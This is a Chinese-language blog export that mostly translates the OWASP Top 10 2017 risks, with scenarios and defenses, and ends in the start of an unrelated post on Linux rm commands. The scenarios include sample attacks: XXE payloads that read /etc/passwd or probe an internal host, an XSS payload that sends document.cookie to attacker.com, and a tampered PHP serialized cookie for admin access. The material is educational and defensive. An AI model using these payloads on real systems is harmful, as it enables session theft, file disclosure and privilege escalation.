<p>允许密码填充，这使得攻击者获得有效用户名和密码的列表。<br>允许暴力破解或其他自动攻击。<br>允许默认的、弱的或众所周知的密码，例如“Password1”或“admin/admin”。<br>使用弱的或失效的验证凭证，忘记密码程序，例如“基于知识的答案”，这是不安全的。<br>使用明文、加密或弱散列密码（参见：A3:2017-敏感数据泄露）。<br>缺少或失效的多因素身份验证。<br>暴露URL中的会话ID（例如URL重写）。<br>在成功登录后不会更新会话ID。<br>不正确地使会话ID失效。当用户不活跃的时候，用户会话或认证令牌（特别是单点登录（SSO）令牌）没有正确注销或失效。<br>案例场景<br>场景#1：<br>凭证填充，使用已知密码的列表，是常见的攻击。如果应用程序不限制身份验证尝试，则可以将应用程序用作密码oracle，以确定凭证是否有效。</p>
<p>场景#2：<br>大多数身份验证攻击都是由于使用密码作为唯一的因素。依据最佳实践，最新的密码轮换和复杂性要求鼓励用户使用、重用以及重用弱密码。建议组织NIST-800-63中停止这些实践，并使用多因素身份验证。</p>
<p>场景#3：<br>应用会话超时设置不正确。用户使用公共计算机访问应用程序。用户直接关闭浏览器选项卡就离开，而不是选择“注销”。攻击者一小时后使用同一个浏览器浏览网页，而当前用户状态仍然是经过身份验证的。</p>
<p>如何防止?<br>在可能的情况下，实现多因素身份验证，以防止自动、凭证填充、暴力破解和被盗凭据再利用攻击。</p>
<p>不要使用发送或部署默认的凭证，特别是管理员用户。<br>执行弱密码检查，例如测试新或变更的密码，以纠正“排名前10000个弱密码” 列表。<br>将密码长度、复杂性和循环策略与NIST-800-63 B的指导方针的记住秘密，或其他现代的基于证据的密码策略相一致。<br>确认注册、凭据恢复和API路径，通过对所有输出结果使用相同的消息，用以抵御账户枚举攻击。<br>限制或逐渐延迟失败的登录尝试。记录所有失败信息并在凭据填充、暴力破解或其他攻击被检测时提醒管理员。<br>使用服务器端安全的内置会话管理器，在登录后生成高度复杂的新随机会话ID。会话ID不能在URL中，可以安全地存储和当登出、闲置、绝对超时后使其失效。</p>
<h3 id="A3-2017-敏感数据泄露"><a href="#A3-2017-敏感数据泄露" class="headerlink" title="A3:2017-敏感数据泄露"></a>A3:2017-敏感数据泄露</h3><p>许多Web应用程序和API都无法正确保护敏感数据，例如：财务数据、医疗数据和PII数据。攻击者可以通过窃取或修改未加密的数据来实施信用卡诈骗、身份盗窃或其他犯罪行为。未加密的敏感数据容易受到破坏，因此，我们需要对敏感数据加密，这些数据包括：传输过程中的数据、存储的数据以及浏览器的交互数据。</p>
<p>知识点简介<br>首先你需要确认的是哪些数据是敏感数据（包含：传输过程中的数据、存储数据）而需要被加密。例如：密码、信用卡卡号、医疗记录、个人信息应该被加密，特别是隐私法律或条例中规定需要加密的数据，如：欧盟《通用数据保护条例》（GDPR）、 属于“金融数据保护条例”的《支付卡行业数据安全标准》（PICDSS）。对于这些数据，要确定：</p>
<p>在数据传输过程中是否使用明文传输? 这和传输协议相关，如：HTTP、SMTP和FTP。外部网络流量非常危险。验证所有的内部通信，如：负载平衡器、Web服务器或后端系统之间的通信。<br>当数据被长期存储时，无论存储在哪里，它们是否都被加密，包含备份数据?<br>无论默认条件还是源代码中，是否还在使用任何旧的或脆弱的加密算法?<br>是否使用默认加密密钥，生成或重复使用脆弱的加密密钥，或者缺少恰当的密钥管理或密钥回转?<br>是否强制加密敏感数据，例如：用户代理（如：浏览器）指令和传输协议是否被加密?<br>用户代理（如：应用程序、邮件客户端）是否未验证服务器端证书的有效性?<br>案例场景<br>场景 #1：<br>一个应用程序使用自动化的数据加密系统加密信用卡信息，并存储在数据库中。但是，当数据被检索时被自动解密，这就使得SQL注入漏洞能够以明文形式获得所有信用卡卡号。</p>
<p>场景 #2：<br>一个网站上对所有网页没有使用或强制使用TLS，或者使用弱加密。攻击者通过监测网络流量（如：不安全的无线网络），将网络连接从HTTPS降级到HTTP，就可以截取请求并窃取用户会话cookie。 之后，攻击者可以复制用户cookie并成功劫持经过认证的用户会话、访问或修改用户个人信息。除此之外，攻击者还可以更改所有传输过程中的数据，例如：转款的接接收者。</p>
<p>场景 #3：<br>密码数据库使用未加盐的哈希算法或弱哈希算法去存储每个人的密码。一个文件上传漏洞使黑客能够获取密码文件。所有这些未加盐哈希的密码通过彩虹表暴力破解方式破解。 由简单或快速散列函数生成加盐的哈希，也可以通过GPU破解。</p>
<p>如何防止?<br>对一些需要加密的敏感数据，应该起码做到以下几点：</p>
<p>对系统处理、存储或传输的数据分类，并根据分类进行访问控制。<br>熟悉与敏感数据保护相关的法律和条例，并根据每项法规要求保护敏感数据。<br>对于没必要存放的、重要的敏感数据，应当尽快清除，或者通过PCI DSS标记或拦截。未存储的数据不能被窃取。<br>确保存储的所有敏感数据被加密。<br>确保使用了最新的、强大的标准算法或密码、参数、协议和密匙，并且密钥管理到位。<br>确保传输过程中的数据被加密，如：使用TLC。确保数据加密被强制执行，如：使用HTTP严格安全传输协议（HSTS ）。<br>禁止缓存对包含敏感数据的响应。<br>确保使用密码专用算法存储密码，如：Argon2 、 scrypt 、bcrypt 或者PBKDF2 。将工作因素（延迟因素）设置在可接受范围。<br>单独验证每个安全配置项的有效性。</p>
<h3 id="A4-2017-XML-外部实体（XXE）"><a href="#A4-2017-XML-外部实体（XXE）" class="headerlink" title="A4:2017-XML 外部实体（XXE）"></a>A4:2017-XML 外部实体（XXE）</h3><p>许多较早的或配置错误的XML处理器评估了XML文件中的外部实体引用。攻击者可以利用外部实体窃取使用URI文件处理器的内部文件和共享文件、监听内部扫描端口、执行远程代码和实施拒绝服务攻击。</p>
<p>知识点简介<br>应用程序和特别是基于XML的Web服务或向下集成，可能在以下方面容易受到攻击：</p>
<p>您的应用程序直接接受XML文件或者接受XML文件上传，特别是来自不受信任源的文件，或者将不受信任的数据插入XML文件，并提交给XML处理器解析。<br>在应用程序或基于Web服务的SOAP中，所有XML处理器都启用了文档类型定义（DTDs）。因为禁用DTD进程的确切机制因处理器而不同，更多资料请参考：《 OWASP Cheat Sheet ‘XXE Prevention‘ 》。<br>如果为了实现安全性或单点登录（SSO），您的应用程序使用SAML进行身份认证。而SAML使用XML进行身份确认，那么您的应用程序就容易受到XXE攻击。<br>如果您的应用程序使用第1.2版之前的SOAP，并将XML实体传递到SOAP框架，那么它可能受到XXE攻击。<br>存在XXE缺陷的应用程序更容易受到拒绝服务攻击，包括：Billion Laughs 攻击。<br>案例场景<br>大量XXE缺陷已经被发现并被公开，这些缺陷包括嵌入式设备的XXE缺陷。 XXE缺陷存在于许多意想不到的地方，这些地方包括深嵌套的依赖项。最简单的方法是上传可被接受的恶意XML文件：</p>
<p>场景 #1：攻击者尝试从服务端提取数据：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot; &gt;]&gt;</span><br><span class="line">&lt;foo&gt;&amp;xxe;&lt;&#x2F;foo&gt;</span><br></pre></td></tr></table></figure>
<p>场景 #2：攻击者通过将上面的实体行更改为以下内容来探测服务器的专用网络：<br><code>&lt;!ENTITY xxe SYSTEM &quot;https://192.168.1.1/private&quot; &gt;]&gt;</code><br>场景 #3：攻击者通过恶意文件执行拒绝服务攻击：<br><code>&lt;!ENTITY xxe SYSTEM &quot;file:///dev/random&quot; &gt;]&gt;</code><br>如何防止?<br>开发人员培训是识别和减少XXE缺陷的关键，此外，防止XXE 缺陷还需要：</p>
<p>尽可能使用简单的数据格式（如：JSON），避免对敏感数据进行序列化。<br>及时修复或更新应用程序或底层操作系统使用的所有XML处理器和库。同时，通过依赖项检测，将SOAP更新到1.2版本或更高版本。<br>参考《 OWASP Cheat Sheet ‘XXE Prevention‘ 》在应用程序的所有XML解析器中禁用XML外部实体和DTD进程。<br>在服务器端实施积极的（“白名单”）输入验证、过滤和清理，以防止在XML文档、标题或节点中出现恶意数据。<br>验证XML或XSL文件上传功能是否使用XSD验证或其他类似验证方法来验证上传的XML文件。<br>尽管在许多集成环境中，手动代码审查是大型、复杂应用程序的最佳选择，但是SAST 工具可以检测源代码中的XXE漏洞。如果无法实现这些控制，请考虑使用虚拟修复程序、API安全网关或Web应用程序防火墙（ WAF ）来检测、监控和防止XXE攻<br>击。</p>
<h3 id="A5-2017-失效的访问控制"><a href="#A5-2017-失效的访问控制" class="headerlink" title="A5:2017-失效的访问控制"></a>A5:2017-失效的访问控制</h3><p>未对通过身份验证的用户实施恰当的访问控制。攻击者可以利用这些缺陷访问未经授权的功能或数据，例如：访问其他用户的帐户、查看敏感文件、修改其他用户的数据、更改访问权限等。</p>
<p>知识点简介<br>访问控制强制实施策略，使用户无法在其预期的权限之外执行行为。失败的访问控制通常导致未经授权的信息泄露、修改或销毁所有数据、或在用户权限之外执行业务功能。常见的访问控制脆弱点包括：</p>
<p>通过修改 URL、内部应用程序状态或 HTML 页面绕过访问控制检查，或简单地使用自定义的 API 攻击工具。<br>允许将主键更改为其他用户的记录，例如查看或编辑他人的帐户。<br>特权提升。在不登录的情况下假扮用户，或以用户身份登录时充当管理员。<br>元数据操作，如重放或篡改 JWT 访问控制令牌，或作以提升权限的cookie 或隐藏字段。<br>CORS配置错误允许未授权的API访问。<br>以未通过身份验证的用户身份强制浏览的通过身份验证时才能看到的页面、或作为标准用户访问具有相关权限的页面、或API没有对POST、PUT和DELETE强制执行访问控制。<br>案例场景<br>场景 #1：应用程序在访问帐户信息的 SQL调用中使用了未经验证的数据：<br>pstmt.setString(1，request.getParameter(“acct”));<br>ResultSet results = pstmt.executeQuery( );<br>攻击者只需修改浏览器中的“acct”参数即可发送他们想要的任何帐号信息。如果没有正确验证，攻击者可以访问任何用户的帐户。</p>
<p><a href="http://example.com/app/accountInfo?acct=notmyacct" target="_blank" rel="noopener">http://example.com/app/accountInfo?acct=notmyacct</a><br>场景 #2：攻击者仅强制浏览目标URL。管理员权限是访问管理页面所必需的。<br><a href="http://example.com/app/getappInfo" target="_blank" rel="noopener">http://example.com/app/getappInfo</a><br><a href="http://example.com/app/admin_getappInfo" target="_blank" rel="noopener">http://example.com/app/admin_getappInfo</a><br>如果一个未经身份验证的用户可以访问任何页面，那么这是一个缺陷。如果一个非管理员权限的用户可以访问管理页面，那么这同样也是一个缺陷。</p>
<p>如何防止?<br>访问控制只有在受信服务器端代码或没有服务器的 API 中有效，这样这样攻击者才无法修改访问控制检查或元数据。</p>
<p>除公有资源外，默认情况下拒绝访问。<br>使用一次性的访问控制机制，并在整个应用程序中不断重用它们，包括最小化CORS使用。<br>建立访问控制模型以强制执行所有权记录，而不是接受用户创建、读取、更新或删除的任何记录。<br>域访问控制对每个应用程序都是唯一的，但业务限制要求应由域模型强制执行。<br>禁用 Web服务器目录列表，并确保文件元数据（如：git）不存在于 Web的根目录中。<br>记录失败的访问控制，并在适当时向管理员告警（如：重复故障）。<br>对API和控制器的访问进行速率限制，以最大限度地降低自动化攻击工具的危害。<br>当用户注销后，服务器上的JWT令牌应失效。<br>开发人员和 QA人员应包括功能访问控制单元和集成测试人员。</p>
<h3 id="A6-2017-–-安全配置错误"><a href="#A6-2017-–-安全配置错误" class="headerlink" title="A6:2017 – 安全配置错误"></a>A6:2017 – 安全配置错误</h3><p>安全配置错误是最常见的安全问题，这通常是由于不安全的默认配置、不完整的临时配置、开源云存储、错误的 HTTP 标头配置以及包含敏感信息的详细错误信息所造成的。因此，我们不仅需要对所有的操作系统、框架、库和应用程序进行安全配置，而且必须及时修补和升级它们。</p>
<p>知识点简介<br>您的应用程序可能受到攻击，如果应用程序是：</p>
<p>应用程序栈堆的任何部分都缺少适当的安全加固，或者云服务的权限配置错误。<br>应用程序启用或安装了不必要的功能（例如：不必要的端口、服务、网页、帐户或权限）。<br>默认帐户的密码仍然可用且没有更改。<br>错误处理机制向用户披露堆栈跟踪或其他大量错误信息。<br>对于更新的系统，禁用或不安全地配置最新的安全功能。<br>应用程序服务器、应用程序框架（如：Struts、Spring、ASP.NET）、库文件、数据库等没有进行安全配置。<br>服务器不发送安全标头或指令，或者未对服务器进行安全配置。<br>您的应用软件已过期或易受攻击（参见A9：2017-使用含有已知漏洞的组件）。<br>缺少一个体系的、可重复的应用程序安全配置过程，系统将处于高风险中。</p>
<p>案例场景<br>场景#1：<br>应用程序服务器附带了未从产品服务器中删除的应用程序样例。这些样例应用程序具有已知的安全漏洞，攻击者利用这些漏洞来攻击服务器。如果其中一个应用程序是管理员控制台，并且没有更改默认账户，攻击者就可以通过默认密码登录，从而接管服务器。</p>
<p>场景#2：<br>目录列表在服务器端未被禁用。攻击者发现他们很容易就能列出目录列表。攻击者找到并下载所有已编译的Java类，他们通过反编译来查看代码。然后，攻击者在应用程序中找到一个严重的访问控制漏洞。</p>
<p>场景#3：<br>应用服务器配置允许将详细的错误信（如：堆栈跟踪信息）返回给用户，这可能会暴露敏感信息或潜在的漏洞，如：已知含有漏洞的组件的版本信息。</p>
<p>场景#4：<br>云服务向其他CSP用户提供默认的网络共享权限。这允许攻击者访问存储在云端的敏感数据。</p>
<p>如何防止?<br>应实施安全的安装过程，包括：</p>
<p>一个可以快速且易于部署在另一个锁定环境的可重复的加固过程。开发、质量保证和生产环境都应该进行相同配置，并且，在每个环境中使用不同的密码。这个过程应该是自动化的，以尽量减少安装一个新安全环境的耗费。<br>搭建最小化平台，该平台不包含任何不必要的功能、组件、文档和示例。移除或不安装不适用的功能和框架。<br>检查和修复安全配置项来适应最新的安全说明、更新和补丁，并将其作为更新管理过程的一部分，（参见A9：2017-使用含有已知漏洞的组件）。在检查过程中，应特别注意云存储权限（如：S3桶权限）。<br>一个能在组件和用户间提供有效的分离和安全性的分段应用程序架构，包括：分段、容器化和云安全组。<br>向客户端发送安全指令，如：安全标头。<br>在所有环境中能够进行正确安全配置和设置的自动化过程。</p>
<h3 id="A7-2017-–-跨站脚本（XSS）"><a href="#A7-2017-–-跨站脚本（XSS）" class="headerlink" title="A7:2017 – 跨站脚本（XSS）"></a>A7:2017 – 跨站脚本（XSS）</h3><p>当应用程序的新网页中包含不受信任的、未经恰当验证或转义的数据时，或者使用可以创建 HTML或JavaScript 的浏览器 API 更新现有的网页时，就会出现 XSS 缺陷。XSS 让攻击者能够在受害者的浏览器中执行脚本，并劫持用户会话、破坏网站或将用户重定向到恶意站点。</p>
<p>知识点简介<br>存在三种XSS类型，通常针对用户的浏览器：</p>
<p>反射式XSS：应用程序或API包括未经验证和未经转义的用户输入，作为HTML输出的一部分。一个成功的攻击可以让攻击者在受害者的浏览器中执行任意的HTML和JavaScript。 通常，用户将需要与指向攻击者控制页面的某些恶意链接进行交互，例如恶意漏洞网站，广告或类似内容。</p>
<p>存储式XSS：你的应用或者API将未净化的用户输入存储下来了，并在后期在其他用户或者管理员的页面展示出来。 存储型XSS一般被认为是高危或严重的风险。</p>
<p>基于DOM的XSS：会动态的将攻击者可控的内容加入页面的JavaScript框架、单页面程序或API存在这种类型的漏洞。理想的来说，你应该避免将攻击者可控的数据发送给不安全的JavaScriptAPI。</p>
<p>典型的XSS攻击可导致盗取session、账户、绕过MFA、DIV替换、对用户浏览器的攻击（例如：恶意软件下载、键盘记录）以及其他用户侧的攻击。</p>
<p>案例场景<br>场景#1：应用程序在下面HTML代码段的构造中使用未经验证或转义的不可信的数据：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(String) page +&#x3D; &quot;&lt;input name&#x3D;&#39;creditcard&#39; type&#x3D;&#39;TEXT‘</span><br><span class="line">value&#x3D;&#39;&quot; + request.getParameter(&quot;CC“) + &quot;&#39;&gt;&quot;;</span><br></pre></td></tr></table></figure>
<p>攻击者在浏览器中修改“CC” 参数为如下值：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;&gt;&lt;script&gt;document.location&#x3D;&#39;http:&#x2F;&#x2F;www.attacker.com&#x2F;cgi-bin&#x2F;cookie.cgi?foo&#x3D;&#39;+document.cookie&lt;&#x2F;script&gt;&#39;.</span><br></pre></td></tr></table></figure>
<p>这个攻击导致受害者的会话ID被发送到攻击者的网站，使得攻击者能够劫持用户当前会话。</p>
<p>注意：攻击者同样能使用跨站脚本攻破应用程序可能使用的任何跨站请求伪造（CSRF）防御机制。CSRF的详细情况见2013年版中的A8项。</p>
<p>如何防止?<br>防止XSS需要将不可信数据与动态的浏览器内容区分开。这可以通过如下步骤实现：</p>
<p>使用设计上就会自动编码来解决XSS问题的框架，如：Ruby 3.0或 React JS。了解每个框架的XSS保护的局限性，并适当地处理未覆盖的用例。<br>为了避免反射式或存储式的XSS漏洞，最好的办法是根据HTML输出的上下文（包括：主体、属性、JavaScript、CSS或URL）对所有不可信的HTTP请求数据进行恰当的转义 。更多关于数据转义技术的信息见：《OWASP Cheat Sheet ‘XSS Prevention’》。<br>在客户端修改浏览器文档时，为了避免DOM XSS攻击，最好的选择是实施上下文敏感数据编码。如果这种情况不能避免，可以采用《OWASP Cheat Sheet ‘DOM based XSS Prevention ‘》描述的类似上下文敏感的转义技术应用于浏览器API。<br>使用内容安全策略（CSP）是对抗XSS的深度防御策略。如果不存在可以通过本地文件放置恶意代码的其他漏洞（例如：路径遍历覆盖和允许在网络中传输的易受攻击的库），则该策略是有效的。</p>
<h3 id="A8-2017-–-不安全的反序列化"><a href="#A8-2017-–-不安全的反序列化" class="headerlink" title="A8:2017 – 不安全的反序列化"></a>A8:2017 – 不安全的反序列化</h3><p>不安全的反序列化会导致远程代码执行。即使反序列化缺陷不会导致远程代码执行，攻击者也可以利用它们来执行攻击，包括：重播攻击、注入攻击和特权升级攻击。</p>
<p>知识点简介<br>如果反序列化进攻者提供的敌意或者篡改过的对象将会使将应用程序和API变的脆弱。这可能导致两种主要类型的攻击：</p>
<p>如果应用中存在可以在反序列化过程中或者之后被改变行为的类，则攻击者可以通过改变应用逻辑或者实现远程代码执行攻击。我们将其称为对象和数据结构攻击。<br>典型的数据篡改攻击，如访问控制相关的攻击，其中使用了现有的数据结构，但内容发生了变化。<br>在应用程序中，序列化可能被用于:</p>
<p>远程和进程间通信（RPC / IPC）<br>连线协议、Web服务、消息代理<br>缓存/持久性<br>数据库、缓存服务器、文件系统<br>HTTP cookie、HTML表单参数、API身份验证令牌<br>案例场景<br>场景 #1：<br>一个React应用程序调用了一组Spring Boot微服务。作为功能性程序员，他们试图确保他们的代码是不可变的。他们提出的解决方法是序列化用户状态，并在每次请求时来回传递。攻击者注意到了“R00”Java对象签名，并使用Java Serial Killer工具在应用服务器上获得远程代码执行。</p>
<p>场景 #2：<br>一个PHP论坛使用PHP对象序列化来保存一个“超级”cookie。该cookie包含了用户的用户ID、角色、密码哈希和其他状态：</p>
<p>a:4:{i:0;i:132;i:1;s:7:”Mallory”;i:2;s:4:”user”;<br>i:3;s:32:”b6a8b3bea87fe0e05022f8f3c88bc960”;}<br>攻击者更改序列化对象以授予自己为admin权限：</p>
<p>a:4:{i:0;i:1;i:1;s:5:”Alice”;i:2;s:5:”admin”;<br>i:3;s:32:”b6a8b3bea87fe0e05022f8f3c88bc960”;}<br>如何防止?<br>唯一安全的架构模式是不接受来自不受信源的序列化对象，或使用只允许原始数据类型的序列化媒体。如果上述不可能的话，考虑使用下述方法：</p>
<p>执行完整性检查，如：任何序列化对象的数字签名，以防止恶意对象创建或数据篡改。<br>在创建对象之前强制执行严格的类型约束，因为代码通常被期望成一组可定义的类。绕过这种技术的方法已经被证明，所以完全依赖于它是不可取的。<br>如果可能，隔离运行那些在低特权环境中反序列化的代码。<br>记录反序列化的例外情况和失败信息，如：传入的类型不是预期的类型，或者反序列处理引发的例外情况。<br>限制或监视来自于容器或服务器传入和传出的反序列化网络连接。<br>监控反序列化，当用户持续进行反序列化时，对用户进行警告。</p>
<h3 id="A9-2017-–使用含有已知漏洞的组件"><a href="#A9-2017-–使用含有已知漏洞的组件" class="headerlink" title="A9:2017 –使用含有已知漏洞的组件"></a>A9:2017 –使用含有已知漏洞的组件</h3><p>组件（例如：库、框架和其他软件模块）拥有和应用程序相同的权限。如果应用程序中含有已知漏洞的组件被攻击者利用，可能会造成严重的数据丢失或服务器接管。同时，使用含有已知漏洞的组件的应用程序和API可能会破坏应用程序防御、造成各种攻击并产生严重影响。</p>
<p>知识点简介<br>如果满足下面的某个条件，那么你的应用就易受此类攻击：</p>
<p>如果你不知道所有使用的组件版本信息（包括：服务端和客户端）。这包括了直接使用的组件或其依赖的组件。<br>如果软件易受攻击，不再支持或者过时。这包括：OS、Web服务器、应用程序服务器、数据库管理系统（DBMS）、应用程序、API和所有的组件、运行环境和库。<br>如果你不会定期做漏洞扫描和订阅你使用组件的安全公告。<br>如果你不基于风险并及时修复或升级底层平台、框架和依赖库。很可能发生这种情况：根据变更控制，每月或每季度进行升级，这使得组织在这段时间内会受到已修复但未修补的漏洞的威胁。<br>如果软件工程师没有对更新的、升级的或打过补丁的组件进行兼容性测试。<br>如果你没有对组件进行安全配置（请参考“A6:2017-安全配置错误”）。<br>案例场景<br>场景 #1：<br>很多时候组件都是以与应用相同的权限运行的，这使得组件里的缺陷可能导致各式各样的问题。这些缺陷可能是偶然的（如：编码错误），也可能是蓄意的（如：组件里的后门）。下面是一些已被利用的漏洞：</p>
<p>CVE-2017-5638，一个Struts2远程执行漏洞。 可在服务端远程执行代码，并已造成巨大的影响。<br>虽然物联网（IoT）设备一般难以通过打补丁来修复。但对之打补丁非常重要（如：医疗设备）。<br>有些自动化工具能帮助攻击者发现未打补丁的或配置不正确的系统。例如 ：Shodan IOT搜索引擎能帮助你发现从2014年四月至今仍存在心脏出血漏洞的设备。</p>
<p>如何防止?<br>应该制定一个补丁管理流程：</p>
<p>移除不使用的依赖、不需要的功能、组件、文件和文档。<br>利用如 versions、DependencyCheck 、retire.js等工具来持续的记录客户端和服务器端以及它们的依赖库的版本信息。持续监控如CVE 和 NVD等是否发布已使用组件的漏洞信息，可以使用软件分析工具来自动完成此功能。订阅关于使用组件安全漏洞的警告邮件。<br>仅从官方渠道安全的获取组件，并使用签名机制来降低组件被篡改或加入恶意漏洞的风险<br>监控那些不再维护或者不发布安全补丁的库和组件。如果不能打补丁，可以考虑部署虚拟补丁来监控、检测或保护。每个组织都应该制定相应的计划，对整个软件生命周期进行监控、评审、升级或更改配置。</p>
<h3 id="A10-2017-–-不足的日志记录和监控"><a href="#A10-2017-–-不足的日志记录和监控" class="headerlink" title="A10:2017 – 不足的日志记录和监控"></a>A10:2017 – 不足的日志记录和监控</h3><p>不足的日志记录和监控，以及事件响应缺失或无效的集成，使攻击者能够进一步攻击系统、保持持续性或转向更多系统，以及篡改、提取或销毁数据。大多数缺陷研究显示，缺陷被检测出的时间超过200天，且通常通过外部检测方检测，而不是通过内部流程或监控检测。</p>
<p>知识点简介<br>下列情况会导致不足的日志记录、检测、监控和响应：</p>
<p>未记录可审计性事件，如：登录、登录失败和高额交易。<br>告警和错误事件未能产生或产生不足的和不清晰的日志信息。<br>没有利用应用系统和API的日志信息来监控可疑活动。<br>日志信息仅在本地存储。<br>没有定义合理的告警阈值和制定响应处理流程。<br>渗透测试和使用DAST工具（如：OWASP ZAP）扫描没有触发告警<br>对于实时或准实时的攻击，应用程序无法检测、处理和告警。如果你的应用使得日志信息或告警信息对用户或者攻击者可见，你就很容易遭受信息泄露攻击（请参考A3：2017-敏感信息泄露）<br>案例场景<br>场景#1：<br>一个由小团队运营的开源项目论坛软件被攻击者利用其内在漏洞攻陷了。 攻击者设法删除了包含下一个版本的内部源代码仓库以及所有论坛内容。 虽然代码可以恢复，但由于缺乏监控、日志记录和告警导致了更糟糕的结果。 由于此问题，该论坛软件项目不再活跃。</p>
<p>场景#2：<br>攻击者使用通用密码进行用户扫描并能获取所有使用此密码的账户。对于其他账户而言，将仅有一次失败的登陆尝试记录。一段时间以后，攻击者可以用另一个密码再次进行此活动。</p>
<p>场景#3：<br>美国的一家大型零售商据内部使用恶意软件分析沙箱做分析。 沙箱软件检测到了一些可能不需要的软件，但没有人响应此次检测。 在一个境外银行不正当的信用卡交易被检测到之前，该沙箱软件一直在产生告警信息。</p>
<p>如何防止?<br>根据应用程序存储或处理的数据的风险：:</p>
<p>确保所有登录、访问控制失败、输入验证失败能够被记录到日志中去，并保留足够的用户上下文信息，以识别可疑或恶意帐户，并为后期取证预留足够时间。<br>确保日志以一种能被集中日志管理解决方案使用的形式生成<br>确保高额交易有完整性控制的审计信息，以防止篡改或删除，例如审计信息保存在只能进行记录增加的数据库表中。<br>建立有效的监控和告警机制，使可疑活动在可接受的时间内被发现和应对。<br>建立或采取一个应急响应机制和恢复计划，例如：NIST 800-61 rev 2或更新版本。<br>目前已有商业的和开源的应用程序防护框架（例如：OWASP AppSensor）、Web应用防火墙（例如 ：Modsecurity with theOWASP Core Rule Set）、带有自定义仪表盘和告警功能的日志关联软件。</p>
<h3 id="开发人员下一步做什么"><a href="#开发人员下一步做什么" class="headerlink" title="开发人员下一步做什么?"></a>开发人员下一步做什么?</h3><p>建立并使用可重复使用的安全流程和标准安全控制</p>
<p>无论您是刚接触Web应用程序安全，还是已经非常熟悉各种安全风险，创建一个安全的Web应用程序或修复一个已存在的应用程序的任务都可能很困难。若您需要管理一个大型的应用程序系统群，那任务将十分艰巨。</p>
<p>为帮助企业和开发人员以节省成本的方式降低应用程序的安全风险，OWASP创建了相当多的免费和开源的资源。您可以使用这些资源来解决您企业组织的应用程序安全问题。以下内容是OWASP为帮助企业组织创建安全的Web应用程序和API提供的一些资源。在下一页中，我们将展示其它可以帮助企业用于检查Web应用程序和接口安全性的OWASP资源。</p>
<h3 id="安全测试人员下一步做什么"><a href="#安全测试人员下一步做什么" class="headerlink" title="安全测试人员下一步做什么?"></a>安全测试人员下一步做什么?</h3><p>建立持续性的应用安全测试</p>
<p>安全编码很重要。但验证你想达到的安全性是否真实存在、是否正确、是否像我们想的那样也很关键。应用程序安全测试的目标是提供这些证据。这项工作困难而复杂，敏捷和DevOps当前快速发展的过程给传统的方法和工具带来的极大的挑战。因此，我们强烈建议你思考如何专注于整个应用程序组合中重要的地方，并且低成本高收益。</p>
<p>当前安全风险变化很快，每年进行一次的扫描或渗透测试的日子已经过去了。现代软件开发需要在整个软件开发生命周期中进行持续的应用安全测试。通过安全自动化来加强现有的开发管道并不会减缓开发速度。无论你选择哪种方法，都需考虑一下每年随着应用系统的规模倍增的定期测试、修复、复测并重新部署应用程序的成本。</p>
<h3 id="企业组织下一步做什么"><a href="#企业组织下一步做什么" class="headerlink" title="企业组织下一步做什么?"></a>企业组织下一步做什么?</h3><p>现在就启动您的应用程序安全计划</p>
<p>应用程序安全已经不再是一个选择了。在日益增长的攻击和监管的压力下，企业组织必须建立一个有效的能力去确保应用程序和API的安全。由于在生产环境中的应用程序和APIs的代码行数惊人，许多企业组织都在努力处理数量巨大的漏洞。</p>
<p>OWASP建议这些企业组织建立一个应用程序安全计划，深入了解并改善它们的应用程序组合的安全性。为了实现应用程序的安全性，需要企业组织中的不同部门之间有效地协同工作，这包括安全和审计、软件开发、商业和执行管理。安全应该可视化和可量化，让所有不同角色的人都可以看到并理解企业组织的应用程序的安全态势。通过消除或降低风险的方式专注于活动和结果，以帮助提高企业安全性。《OWASP SAMM》和首席信息官的《OWASP应用安全指南》是这个列表中大多数关键活动的来源。</p>
<h3 id="应用程序管理者下一步做什么"><a href="#应用程序管理者下一步做什么" class="headerlink" title="应用程序管理者下一步做什么?"></a>应用程序管理者下一步做什么?</h3><p>管理完整的应用程序生命周期</p>
<p>应用程序是人创建和维护的最复杂的系统之一。应用程序的IT管理应该由IT专家来完成，并且由专家们负责应用程序的整个IT生命周期。</p>
<p>我们建议建立应用程序管理器的角色对等于应用程序所有者。应用程序管理器负责整个应用程序生命周期，从尝尝被忽视的IT角度，这包含收集需求到系统下线的过程。</p>
<h3 id="风险因素总结"><a href="#风险因素总结" class="headerlink" title="风险因素总结"></a>风险因素总结</h3><p>攻击者可以通过应用程序中许多不同的路径方法去危害您的业务或者企业组织。每种路径方法都代表了一种风险，这些风险可能会，也可能不会严重到值得您去关注。</p>
<p>有时，这些路径方法很容易被发现并利用，但有的则非常困难。同样，所造成的危害有可能无关紧要，也可能导致破产。为了确定您企业的风险，可以结合其产生的技术影响和对企业的业务影响，去评估威胁来源、攻击向量和安全漏洞的可能性。总之，这些因素决定了全部的风险。</p>
<p>下面的表格总结了2017年版Top 10应用程序安全风险因素，以及我们赋予每个风险因素的风险值。这些因素基于OWASP团队拥有的统计数据和经验而决定。为了了解某个特定的应用程序或者企业组织的风险，您必须考虑您自己的威胁代理和业务影响。如果没有相应位置上的威胁代理去执行必要的攻击，或者产生的业务影响微不足道，那么就是再严重的软件漏洞也不会导致一个严重的安全风险。</p>
]]></content>
  </entry>
  <entry>
    <title>raspberrypi</title>
    <url>/2020/05/05/raspberrypi/</url>
    <content><![CDATA[<h3 id="linux常用命令"><a href="#linux常用命令" class="headerlink" title="linux常用命令"></a>linux常用命令</h3><p>删除：rm [选项] 文件或目录(rm -r )</p>
<a id="more"></a>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;rm -f&quot;    #强行删除，忽略不存在的文件，不提示确认。(f为force的意思)</span><br><span class="line">&quot;rm -i&quot;    #进行交互式删除，即删除时会提示确认。(i为interactive的意思)</span><br><span class="line">&quot;rm -r&quot;    #将参数中列出的全部目录和子目录进行递归删除。(r为recursive的意思)</span><br><span class="line">&quot;rm -v&quot;    #详细显示删除操作进行的步骤。(v为verbose的意思)</span><br></pre></td></tr></table></figure>
